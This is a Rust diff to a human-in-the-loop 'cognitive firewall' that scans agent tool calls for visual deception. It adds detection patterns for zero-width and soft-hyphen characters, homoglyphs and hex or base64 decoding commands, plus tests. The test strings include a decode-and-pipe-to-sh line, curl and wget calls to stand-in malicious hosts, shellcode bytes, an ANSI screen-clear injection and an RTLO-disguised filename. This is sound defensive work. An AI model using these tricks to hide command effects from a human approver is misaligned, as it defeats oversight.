@@ -403,23 +403,40 @@ impl HitlCognitiveFirewall {
             ));
         }
 
-        // 2. Zero-width characters (U+200B..=U+200D, U+FEFF, U+2060)
-        if input
-            .chars()
-            .any(|c| matches!(c, '\u{200B}'..='\u{200D}' | '\u{FEFF}' | '\u{2060}'))
-        {
+        // 2. Zero-width characters & soft hyphens (U+00AD, U+200B..=U+200D, U+FEFF, U+2060, U+180E)
+        if input.chars().any(|c| {
+            matches!(
+                c,
+                '\u{00AD}' | '\u{200B}'..='\u{200D}' | '\u{FEFF}' | '\u{2060}' | '\u{180E}'
+            )
+        }) {
             findings.push(HitlDeceptionIndicator::ZeroWidthSteganography(
-                "Detected invisible zero-width characters splitting command tokens".to_string(),
+                "Detected invisible zero-width or soft-hyphen characters splitting command tokens"
+                    .to_string(),
             ));
         }
 
-        // 3. UTS #39 mixed-script Cyrillic/Greek confusable homographs mixed with ASCII letters
+        // 3. UTS #39 mixed-script Cyrillic/Greek confusable homographs mixed with ASCII letters or isolated lookalikes
         let has_ascii_alpha = input.chars().any(|c| c.is_ascii_alphabetic());
         let has_confusable_script = input.chars().any(|c| {
             let u = c as u32;
             (0x0400..=0x04FF).contains(&u) || (0x0370..=0x03FF).contains(&u)
         });
-        if has_ascii_alpha && has_confusable_script {
+        let has_latin_confusable = input.chars().any(|c| {
+            matches!(
+                c,
+                // Cyrillic lookalikes
+                '\u{0430}' | '\u{0441}' | '\u{0435}' | '\u{043E}' | '\u{0440}' | '\u{0405}' |
+                '\u{0445}' | '\u{0443}' | '\u{0456}' | '\u{0458}' | '\u{0410}' | '\u{0412}' |
+                '\u{0421}' | '\u{0415}' | '\u{041D}' | '\u{041E}' | '\u{0420}' | '\u{0422}' | '\u{0425}' |
+                // Greek lookalikes
+                '\u{03B1}' | '\u{03B2}' | '\u{03B5}' | '\u{03B9}' | '\u{03BA}' | '\u{03BF}' |
+                '\u{03C1}' | '\u{03C4}' | '\u{03C5}' | '\u{03C7}' | '\u{0391}' | '\u{0392}' |
+                '\u{0395}' | '\u{0397}' | '\u{0399}' | '\u{039A}' | '\u{039C}' | '\u{039D}' |
+                '\u{039F}' | '\u{03A1}' | '\u{03A4}' | '\u{03A7}'
+            )
+        });
+        if (has_ascii_alpha && has_confusable_script) || has_latin_confusable {
             findings.push(HitlDeceptionIndicator::UnicodeConfusableHomograph(
                 "Detected UTS #39 mixed-script ASCII + Cyrillic/Greek homograph lookalike characters"
                     .to_string(),
@@ -435,15 +452,28 @@ impl HitlCognitiveFirewall {
 
         // 5. Base64 / Hex obfuscated shell payloads
         let lower = input.to_ascii_lowercase();
+        let has_hex_payload = lower.contains("certutil -decodehex")
+            || lower.contains("certutil.exe -decodehex")
+            || lower.contains("fromhexstring")
+            || lower.contains("xxd -r")
+            || lower.contains("xxd -p")
+            || lower.contains("base64 --decode")
+            || lower.contains("base64 -d")
+            || lower.contains(" -e ")
+            || lower.contains(" /e ")
+            || (lower.contains("\\x") && lower.matches("\\x").count() >= 4)
+            || (lower.contains("0x") && lower.matches("0x").count() >= 4);
+
         if lower.contains("-enc ")
             || lower.contains("-encodedcommand")
             || lower.contains("frombase64string")
             || lower.contains("| base64 -d")
             || lower.contains("|base64 -d")
             || lower.contains("eval(atob(")
+            || has_hex_payload
         {
             findings.push(HitlDeceptionIndicator::ObfuscatedShellPayload(
-                "Detected base64/encoded shell payload hiding true command effect from human reviewer"
+                "Detected base64/hex encoded shell payload hiding true command effect from human reviewer"
                     .to_string(),
             ));
         }
@@ -797,5 +827,86 @@ mod tests {
             }
             other => panic!("Expected RequireTypedBlastRadiusChallenge, got {:?}", other),
         }
+    }
+
+    #[test]
+    fn test_hitl_cognitive_firewall_hex_payload_detection() {
+        let certutil_cmd = "certutil -decodehex in.hex out.exe";
+        let certutil_indicators = HitlCognitiveFirewall::scan_for_visual_deception(certutil_cmd);
+        assert!(certutil_indicators
+            .iter()
+            .any(|i| matches!(i, HitlDeceptionIndicator::ObfuscatedShellPayload(_))));
+
+        let fromhex_cmd = "powershell -c [Convert]::FromHexString('4d5a9000')";
+        let fromhex_indicators = HitlCognitiveFirewall::scan_for_visual_deception(fromhex_cmd);
+        assert!(fromhex_indicators
+            .iter()
+            .any(|i| matches!(i, HitlDeceptionIndicator::ObfuscatedShellPayload(_))));
+
+        let xxd_cmd = "cat payload.hex | xxd -r -p | sh";
+        let xxd_indicators = HitlCognitiveFirewall::scan_for_visual_deception(xxd_cmd);
+        assert!(xxd_indicators
+            .iter()
+            .any(|i| matches!(i, HitlDeceptionIndicator::ObfuscatedShellPayload(_))));
+
+        let shellcode = "echo -ne '\\x90\\x90\\x90\\x90\\x31\\xc0'";
+        let shellcode_indicators = HitlCognitiveFirewall::scan_for_visual_deception(shellcode);
+        assert!(shellcode_indicators
+            .iter()
+            .any(|i| matches!(i, HitlDeceptionIndicator::ObfuscatedShellPayload(_))));
+    }
+
+    #[test]
+    fn test_hitl_cognitive_firewall_soft_hyphen_and_ansi_escape() {
+        let soft_hyphen = "curl\u{00AD} http://malicious.local";
+        let indicators1 = HitlCognitiveFirewall::scan_for_visual_deception(soft_hyphen);
+        assert!(indicators1
+            .iter()
+            .any(|i| matches!(i, HitlDeceptionIndicator::ZeroWidthSteganography(_))));
+
+        let mongolian = "wget\u{180E} http://evil.local";
+        let indicators2 = HitlCognitiveFirewall::scan_for_visual_deception(mongolian);
+        assert!(indicators2
+            .iter()
+            .any(|i| matches!(i, HitlDeceptionIndicator::ZeroWidthSteganography(_))));
+
+        let ansi = "Status: OK\x1b[2JOverwritten!";
+        let indicators3 = HitlCognitiveFirewall::scan_for_visual_deception(ansi);
+        assert!(indicators3
+            .iter()
+            .any(|i| matches!(i, HitlDeceptionIndicator::AnsiEscapeInjection(_))));
+    }
+
+    #[test]
+    fn test_hitl_cognitive_firewall_threshold_boundaries() {
+        // Low divergence: benign task with benign tool -> StandardHitlAllowed
+        let benign = HitlCognitiveFirewall::evaluate_hitl_escalation(
+            "Read documentation",
+            "Inspecting README.md",
+            "read_file",
+            "C:\\workspace\\README.md",
+            "",
+            MeshTaintLevel::TrustedInternal,
+        );
+        match benign {
+            HitlFirewallDecision::StandardHitlAllowed { blast_radius } => {
+                assert!(blast_radius.divergence_score < 0.45);
+            }
+            other => panic!("Expected StandardHitlAllowed, got {:?}", other),
+        }
+
+        // Auto-veto on RTLO override
+        let rtlo = HitlCognitiveFirewall::evaluate_hitl_escalation(
+            "Run script",
+            "Executing benign file",
+            "shell_exec",
+            "test\u{202E}fdp.exe",
+            "",
+            MeshTaintLevel::TrustedInternal,
+        );
+        assert!(matches!(
+            rtlo,
+            HitlFirewallDecision::AutoVetoDeceptive { .. }
+        ));
     }
 }
